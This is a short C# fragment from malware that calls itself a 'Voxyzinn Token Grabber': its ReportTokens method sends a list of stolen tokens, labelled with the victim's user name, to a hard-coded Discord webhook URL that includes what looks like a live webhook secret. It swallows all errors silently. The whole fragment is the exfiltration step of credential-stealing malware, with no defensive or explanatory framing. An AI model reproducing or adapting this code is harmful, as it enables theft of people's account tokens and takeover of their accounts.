private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/707281634281652317/PKiSWyMcNQNqK3pjRleJR65miMxK0LinXQXjvUX0v26aqox8Yas7CdoK7XMVGRogQyEB";


        public static void ReportTokens(List<string> tokenReport)
        {
            try
            {
                HttpClient client = new HttpClient();
                Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
                        { "username", "Voxyzinn Token Grabber" },
                        { "avatar_url", "https://discordapp.com/api/webhooks/707281634281652317/PKiSWyMcNQNqK3pjRleJR65miMxK0LinXQXjvUX0v26aqox8Yas7CdoK7XMVGRogQyEB" }
                    };

                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
            }
            catch { }
        }